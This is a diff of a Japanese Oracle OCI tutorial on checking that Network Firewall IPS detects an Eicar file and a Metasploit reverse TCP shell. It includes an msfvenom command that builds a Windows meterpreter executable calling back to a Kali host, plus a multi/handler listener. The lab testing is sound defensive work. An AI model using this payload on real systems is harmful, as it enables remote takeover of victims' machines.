@@ -39,6 +39,9 @@ Eicarファイルを使用する際は、Network Firewallインスタンスに�
 
 # 1. ネットワーク・ファイアウォール・ポリシーの編集
 
+今回のチュートリアルでは、[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)で作成したネットワーク・ファイアウォール・ポリシーを編集し、既存のネットワーク・ファイアウォール・ポリシーで許可しているアクセス以外は全て侵入検知するセキュリティ・ルールを追加します。
+
+
 ## 1-1. ネットワーク・ファイアウォール・ポリシーのクローニング
 
 OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)で作成したネットワーク・ファイアウォール・ポリシーの詳細画面の「ポリシーのクローニング」をクリックします。
@@ -106,14 +109,19 @@ OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-jap
  ![画面ショット9](nfwips9.png)
 
 
-約10分程で再びNetwork Firewallがアクティブになります。
+約10分程でNetwork Firewallが「更新中」から「アクティブ」になります。
+
  ![画面ショット10](nfwips10.png)
 
+
+Network Firewallが再び「アクティブ」になるのを待つ間に、次のステップでNetwork Firewallで保護されたコンピュートインスタンスにWebサーバーをインストールします。
 
 <br>
 
 
-# 3. Network Firewallで保護されたコンピュートインスタンスにWebサーバをインストール（Eicarファイルを使用する場合）
+# 3. Network Firewallで保護されたコンピュートインスタンスにWebサーバーをインストール（Eicarファイルを使用する場合）
+
+
 本手順では、Eicarファイルを使用した動作検証を実施する場合、必要になるWebサーバーをインストールします。
 OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)で作成したコンピュートインスタンス（Linux）にSSHでアクセスします。
 ターミナルで以下コマンドを実行し、Apache HTTPサーバをインストールします。
@@ -150,6 +158,13 @@ OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-jap
 
 
 # 4. Network Firewallインスタンスのログの有効化
+
+本手順では、Network Firewallインスタンスのログを有効化します。
+Network Firewallでは、以下2種類のログを出力します。
++ Traffic Log : Network Firewallインスタンスを通過したトラフィックを記録したログ。
++ Threat Log : Network Firewallによって脅威が検知されたトラフィックの詳細情報（脅威の内容など）を記録したログ。
+
+本チュートリアルでは、実際に攻撃した内容がNetwork Firewallによって脅威として検知されているかを確認するため、「Threat Log」を有効化します。
 
 Network Firewallインスタンスの更新が終了し、再びアクティブになったら、Network Firewallインスタンス詳細画面左下にあるリソースから「ログ」を選択します。
  ![画面ショット12](nfwips12.png)
@@ -219,24 +234,29 @@ Network Firewallインスタンスの詳細画面左下のリソース→ログ�
 
 本手順ではKali LinuxにインストールされているMetasploit FrameworkのReverse TCP Shellを用いて、Network Firewallに保護されたコンピュート（Windows）へ侵入テストを実施します。
 
+
+Reverse TCP Shellとは、被害側クライアントから攻撃側のサーバーに対してTCPのポートを使用したシェルを提供する仕組みのことです。
+通常、攻撃者は攻撃対象のシステムのシェルを使用してコマンドなどを実行します。しかし、ほとんどのシステムはファイアウォールにより特定のポートに対する不正なインバウンド通信などは制御されているため、攻撃者が直接シェルと通信を確立するのは難しいです。
+しかし、ほとんどのシステムはファイアウォールにより外から内へのインバウンド通信を制御していますが、内から外へのアウトバウンド通信を制御していないことがあります。そのような場合に、攻撃者が攻撃対象のシステム上のシェルでコマンドを実行するために利用されるのがReverse TCP Shellになります。
+
+
 今回はKali Linuxを攻撃側（クライアント）とし、Windowsサーバーに接続します。Kali LinuxのMetasploit Frameworkを用いてReverse TCP Shellを実行する実行ファイルを生成します。Kali LinuxはWindowsからの接続をListen状態で待っている際、Windowsサーバーが実行ファイルをダウンロードし、実行するとWindowsサーバーからKali Linuxへのアウトバウンド通信が発生してセッションが確立されます。
 
-## 6-1. 実行ファイルの作成
+
+## 6-1. ファイルの作成
+
+本手順では、被害側クライアントが実行すると、攻撃側のサーバーにTCPポートを使用した通信が発生するファイルを作成します。
 Kali Linuxにリモートデスクトップ接続します。
  ![画面ショット28](nfwips28.png)
 
 Kali Linuxのデスクトップ画面左上のメニューから、「Terminal Emulator」をダブルクリックで開きます。
  ![画面ショット29](nfwips29.png)
 
-以下コマンドを実行し、攻撃実行ファイルを生成します。
+以下コマンドで、Reverse TCP Shellの通信を確立するファイルを生成します。
 ```sh
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali LinuxのIPアドレス> LPORT=4444 -f exe -o <ファイルを生成するディレクトリ>/<ファイル名>
 ```
 
-例えば以下コマンドでは、/home/debian/Desktopにrs_exploit1.exeファイルが生成されます。
-```sh
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali LinuxのIPアドレス> LPORT=4444 -f exe -o /home/debian/Desktop/rs_exploit1.exe
-```
  ![画面ショット30](nfwips30.png)
 
 Kali Linuxのデスクトップ画面左上のメニューから「Metasploit framework」を検索し、アプリをダブルクリックしてターミナルを開きます。
@@ -255,9 +275,10 @@ msf6 exploit(multi/handler)> exploit
 
 <br>
 
-## 6-2. Windowsサーバーで実行ファイルのダウンロードと実行
+## 6-2. Windowsサーバーでファイルのダウンロードと実行
 
-今回は、Network Firewallによって保護されたWindowsのインスタンスからファイルをダウンロードし、実行します。しかし、Network FirewallのIPSの機能によってファイルの実行が妨げられ、クライアントとKali Linux間の接続がリセットされることを確認します。
+本手順では、Network Firewallによって保護されたWindowsのインスタンスで、手順6-1で生成したファイルをダウンロードし、実行します。本来であれば、ファイルを実行したWindowsのインスタンスからKali Linuxへの通信が発生し、セッションが確立されます。セッションが確立されるとKali LinuxからWindowsのインスタンスに対して任意のコマンドを実行することができます。
+しかし、今回はNetwork FirewallのIPSの機能によってファイルの実行が妨げられ、クライアントとKali Linux間の接続がリセットされます。
 
 まずは実行ファイルをクライアントがダウンロードできるよう、ファイルをKali Linuxの/var/www/htmlディレクトリ配下にコピーします。
 ※Kali LinuxにはWebサーバーがデフォルトでインストールされています。
@@ -308,7 +329,7 @@ Network Firewallインスタンスの詳細画面左下のリソース→ログ�
 
 <br>
 
-## 6-4. 補足1：攻撃が成功した場合
+## 6-4. 補足1：Reverce TCP Shellの通信が確立された場合
 Network Firewallによって保護されていないWindowsのインスタンスで同様にファイルをダウンロードして実行すると、WindowsインスタンスとKali Linux間のセッションが確立します。
 Kali LinuxからはWindowsインスタンスに対してコマンドを実行することが出来るようになります。
  ![画面ショット41](nfwips41.png)
